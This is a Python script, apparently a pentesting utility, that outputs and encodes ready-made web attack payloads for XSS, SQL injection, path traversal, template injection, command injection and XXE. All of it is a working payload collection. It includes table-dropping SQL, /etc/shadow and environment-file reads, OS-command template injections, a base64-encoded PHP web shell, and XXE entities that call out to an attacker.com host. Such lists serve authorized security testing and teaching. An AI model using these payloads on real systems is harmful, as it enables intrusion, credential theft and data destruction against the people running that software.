#!/usr/bin/env python3
"""
Payload Generator - Generate common security testing payloads
Usage: payloads [--type xss|sqli|lfi|ssti] [--encode base64] [--output file.txt]
"""

import argparse
import base64
import urllib.parse

CYAN = '\033[96m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'
BOLD = '\033[1m'
DIM = '\033[2m'

# XSS Payloads
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '<a href="javascript:alert(1)">click</a>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
    '<svg/onload=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    '<math><maction xlink:href="javascript:alert(1)">click',
    '<form><button formaction="javascript:alert(1)">X',
    '{{constructor.constructor("alert(1)")()}}',  # Angular
    '${alert(1)}',  # Template literal
    '<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)>',
]

# SQL Injection Payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    '" OR "1"="1',
    "1' OR '1'='1",
    "admin' --",
    "admin' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "') OR ('1'='1",
    "1 OR 1=1",
    "1; DROP TABLE users --",
    "'; DROP TABLE users --",
    "1' AND '1'='1",
    "1' AND SLEEP(5) --",
    "1' AND BENCHMARK(10000000,SHA1('test')) --",
    "1' UNION SELECT NULL --",
    "1' UNION SELECT NULL,NULL --",
    "1' UNION SELECT NULL,NULL,NULL --",
    "' UNION SELECT username,password FROM users --",
    "1'; WAITFOR DELAY '0:0:5' --",
    "1' ORDER BY 1 --",
    "1' ORDER BY 10 --",
    "-1 UNION SELECT 1,2,3 --",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --",
    "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1) --",
    "1'; EXEC xp_cmdshell('whoami') --",
    "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
]

# LFI/Path Traversal Payloads
LFI_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "C:\\Windows\\win.ini",
    "C:\\boot.ini",
    "....\\....\\....\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "php://filter/read=string.rot13/resource=index.php",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "expect://id",
    "file:///etc/passwd",
    "/var/www/html/index.php",
    "....//....//....//....//etc/passwd%00",
]

# SSTI Payloads
SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "*{7*7}",
    "@(7*7)",
    "{{config}}",
    "{{self}}",
    "{{request}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "{{config.items()}}",
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__bases__[0].__subclasses__()}}",
    "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
    "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}",
    "{{[].__class__.__base__.__subclasses__()}}",
    "${{<%[%'\"}}%\\.",  # Detection probe
    "{{4*4}}[[5*5]]",
    "{{constructor.constructor('return this')()}}", # Nunjucks
    "{php}echo `id`;{/php}",  # Smarty
    "{system('id')}",  # Smarty
]

# Command Injection Payloads
CMDI_PAYLOADS = [
    "; id",
    "| id",
    "|| id",
    "& id",
    "&& id",
    "`id`",
    "$(id)",
    "; ls -la",
    "| cat /etc/passwd",
    "; cat /etc/passwd",
    "| whoami",
    "; whoami",
    "& whoami",
    "; ping -c 3 127.0.0.1",
    "| ping -c 3 127.0.0.1",
    "`sleep 5`",
    "$(sleep 5)",
    "; sleep 5",
    "| sleep 5",
    "\nid",
    "\r\nid",
    "a]| id #",
    "a]|| id #",
]

# XXE Payloads
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><data>&file;</data>',
]

ALL_PAYLOADS = {
    'xss': ('XSS (Cross-Site Scripting)', XSS_PAYLOADS),
    'sqli': ('SQL Injection', SQLI_PAYLOADS),
    'lfi': ('LFI/Path Traversal', LFI_PAYLOADS),
    'ssti': ('SSTI (Server-Side Template Injection)', SSTI_PAYLOADS),
    'cmdi': ('Command Injection', CMDI_PAYLOADS),
    'xxe': ('XXE (XML External Entity)', XXE_PAYLOADS),
}

def encode_payload(payload, encoding):
    """Encode payload in various formats"""
    if encoding == 'url':
        return urllib.parse.quote(payload)
    elif encoding == 'double-url':
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif encoding == 'base64':
        return base64.b64encode(payload.encode()).decode()
    elif encoding == 'hex':
        return payload.encode().hex()
    elif encoding == 'unicode':
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    elif encoding == 'html':
        return ''.join(f'&#{ord(c)};' for c in payload)
    return payload

def main():
    parser = argparse.ArgumentParser(description='Payload Generator')
    parser.add_argument('--type', '-t', choices=list(ALL_PAYLOADS.keys()), help='Payload type')
    parser.add_argument('--encode', '-e', choices=['url', 'double-url', 'base64', 'hex', 'unicode', 'html'], help='Encoding')
    parser.add_argument('--output', '-o', help='Output file')
    parser.add_argument('--list', '-l', action='store_true', help='List payload types')
    parser.add_argument('--all', '-a', action='store_true', help='Generate all payload types')
    args = parser.parse_args()

    if args.list:
        print(f"\n{BOLD}{CYAN}Available Payload Types{RESET}\n")
        for key, (name, payloads) in ALL_PAYLOADS.items():
            print(f"  {CYAN}{key:6}{RESET} {name} ({len(payloads)} payloads)")
        print()
        return

    print(f"\n{BOLD}{CYAN}Payload Generator{RESET}")
    print(f"{YELLOW}For authorized security testing only{RESET}\n")

    # Collect payloads
    output = []

    if args.all:
        for key, (name, payloads) in ALL_PAYLOADS.items():
            print(f"{BOLD}{name}{RESET}")
            for p in payloads:
                encoded = encode_payload(p, args.encode) if args.encode else p
                output.append(encoded)
                print(f"  {encoded[:80]}{'...' if len(encoded) > 80 else ''}")
            print()
    elif args.type:
        name, payloads = ALL_PAYLOADS[args.type]
        print(f"{BOLD}{name}{RESET}")
        for p in payloads:
            encoded = encode_payload(p, args.encode) if args.encode else p
            output.append(encoded)
            print(f"  {encoded[:80]}{'...' if len(encoded) > 80 else ''}")
        print()
    else:
        print(f"Use --type to select payload type or --list to see options")
        return

    # Save to file
    if args.output and output:
        with open(args.output, 'w') as f:
            f.write('\n'.join(output) + '\n')
        print(f"{DIM}Saved {len(output)} payloads to {args.output}{RESET}\n")

if __name__ == '__main__':
    main()
